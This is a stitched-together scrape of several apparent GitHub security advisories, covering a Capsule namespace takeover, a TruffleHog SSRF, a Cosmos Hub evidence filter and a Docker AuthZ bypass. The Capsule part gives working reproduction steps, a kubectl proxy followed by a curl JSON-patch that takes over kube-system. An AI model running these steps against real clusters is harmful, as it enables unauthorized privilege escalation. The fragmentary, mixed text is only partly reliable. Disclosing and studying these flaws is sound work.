The 'kubectl edit' command was used to patch the namespace, but this operation requires both 'get' and 'patch' permissions, hence the error. One should use methods like 'curl' to directly send a PATCH request; 2. The webhook does not intercept patch operations on 'kube-system' because 'kube-system' does not have an ownerReference.</p>\n<h1 id=\"below-are-my-detailed-reproduction-steps\">Below are my detailed reproduction steps</h1>\n<ol>\n<li>Create a test cluster\n<code>kind create cluster --image=kindest/node:v1.24.15 --name=k8s</code></li>\n<li>Install the capsule\n<code>helm install capsule projectcapsule/capsule -n capsule-system --create-namespace</code></li>\n<li>Create a tenant</li>\n</ol>\n<pre><code>kubectl create -f - &lt;&lt; EOF\napiVersion: capsule.clastix.io/v1beta2\nkind: Tenant\nmetadata:\n  name: tenant1\nspec:\n  owners:\n  - name: alice\n    kind: User\nEOF\n</code></pre>\n<ol start=\"4\">\n<li>Create user alice</li>\n</ol>\n<pre><code>./create-user.sh alice tenant1 capsule.clastix.io\nexport KUBECONFIG=alice-tenant1.kubeconfig\n</code></pre>\n<ol start=\"5\">\n<li>Patch kube-system (The first command is executed in the current shell, while the 2nd and 3rd commands require a different shell window because the current shell is being used as a proxy.)</li>\n</ol>\n<pre><code>kubectl proxy\n\nexport DATA='[{\"op\": \"add\", \"path\": \"/metadata/ownerReferences\", \"value\":[{\"apiVersion\": \"capsule.clastix.io/v1beta2\", \"blockOwnerDeletion\": true, \"controller\": true, \"kind\": \"Tenant\", \"name\": \"tenant1\", \"uid\": \"ce3f2296-4aaa-45b0-a8fe-879d5096f193\"}]}]'\n\ncurl http://localhost:8001/api/v1/namespaces/kube-system/ -X PATCH -d \"$DATA\" -H \"Content-Type: application/json-patch+json\"\n</code></pre>\n<ol start=\"7\">\n<li>Check the result\nThe kube-system is patched successfully.\n<img alt=\"image\" src=\"https://github.com/projectcapsule/capsule/assets/151004196/e2775304-c1f4-494d-ab15-14f6f33e29ec\"></li>\n</ol>\n<h1 id=\"summary\">Summary</h1>\n<p>The tenant-owner can patch any arbitrary namespace that has not been taken over by a tenant (i.e., namespaces without the ownerReference field), thereby gaining control of that namespace.</p>\n<p>I would like to express my apologies once again.

Who is impacted?</em></p>\n<p>This vulnerability allows a malicious actor to craft data in a way that, when scanned by specific detectors, could trigger the detector to make an unauthorized request to an endpoint chosen by the attacker. For an exploit to be effective, the target endpoint must be an unauthenticated GET endpoint that produces side effects. The victim must scan the maliciously crafted data and have such an endpoint targeted for the exploit to succeed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>The vulnerability has been resolved in TruffleHog v3.81.9 and later versions.

This feature enables a provider to set per consumer chain minimum heights for which cryptographic evidence is considered valid. The Cosmos Hub <a href=\"https://github.com/cosmos/gaia/releases/tag/v14.1.0\">v14 upgrade</a> bumped ICS to v2.4.0-lsm and also set the minimum evidence height for both <code>neutron-1</code> and <code>stride-1</code> consumer chains to their respective height at that time (see <a href=\"https://github.com/cosmos/gaia/pull/2821\">PR</a>). As a result, \"older\" cryptographic evidence was no longer accepted by the Hub.</p>\n<p>The Cosmos Hub <a href=\"https://github.com/cosmos/gaia/releases/tag/v15.1.0\">v15 upgrade</a> bumped ICS to <a href=\"https://github.com/cosmos/interchain-security/releases/tag/v3.3.3-lsm\">v3.3.3-lsm</a>, which had the height-base filter for consumer equivocation evidence disabled. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cosmos/gaia/security/advisories/GHSA-83qr-9v2h-qxp4\">https://github.com/cosmos/gaia/security/advisories/GHSA-83qr-9v2h-qxp4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-83qr-9v2h-qxp4\">https://github.com/advisories/GHSA-83qr-9v2h-qxp4</a></li>\n</ul>\n",

            "content_html": "<p>A security vulnerability has been detected in certain versions of Docker Engine, which could allow an attacker to bypass <a href=\"https://docs.docker.com/engine/extend/plugins_authorization/\">authorization plugins (AuthZ)</a> under specific circumstances. The base likelihood of this being exploited is low. This advisory outlines the issue, identifies the affected versions, and provides remediation steps for impacted users.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Using a specially-crafted API request, an Engine API client could make the daemon forward the request or response to an <a href=\"https://docs.docker.com/engine/extend/plugins_authorization/\">authorization plugin</a> without the body. In certain circumstances, the authorization plugin may allow a request which it would have otherwise denied if the body had been forwarded to it.</p>\n<p>A security issue was discovered In 2018,  where an attacker could bypass AuthZ plugins using a specially crafted API request. This could lead to unauthorized actions, including privilege escalation. Although this issue was fixed in Docker Engine <a href=\"https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1\">v18.09.1</a> in January 2019, the fix was not carried forward to later major versions, resulting in a regression. Anyone who depends on authorization plugins that introspect the request and/or response body to make access control decisions is potentially impacted.</p>\n<p>Docker EE v19.03.x and all versions of Mirantis Container Runtime <strong>are not vulnerable.</strong></p>\n<h3 id=\"vulnerability-details\">Vulnerability details</h3>\n<ul>\n<li><strong>AuthZ bypass and privilege escalation:</strong> An attacker could exploit a bypass using an API request with Content-Length set to 0, causing the Docker daemon to forward the request without the body to the AuthZ plugin, which might approve the request incorrectly.</li>\n<li><strong>Initial fix:</strong> The issue was fixed in Docker Engine <a href=\"https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1\">v18.09.1</a> January 2019..</li>\n<li><strong>Regression:</strong> The fix was not included in Docker Engine v19.03 or newer versions.
